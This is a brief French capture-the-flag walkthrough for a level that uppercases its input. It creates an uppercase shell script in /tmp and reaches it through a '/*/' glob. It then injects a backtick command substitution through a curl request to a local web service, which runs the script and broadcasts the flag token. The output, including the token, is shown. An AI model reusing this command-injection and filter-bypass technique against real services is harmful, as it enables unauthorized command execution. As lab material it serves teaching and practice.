On remarque que le contenu en parametre est mis en majuscules, on a donc besoin de creer un fichier en majuscule, par example a "/tmp/" et pour y acceder, on va mettre "/*/" pour bypass la securite et ne pas mettre "TMP". Dans le fichier, on envoi donc le flag a tout les users.


cat /tmp/GIVEFLAG.SH
#!/bin/bash

getflag | wall

chmod +x /tmp/GIVEFLAG.SH

curl 'http://127.0.0.1:4646/?x=`/*/giveflag.sh`'
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 13:44 ...                                               
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr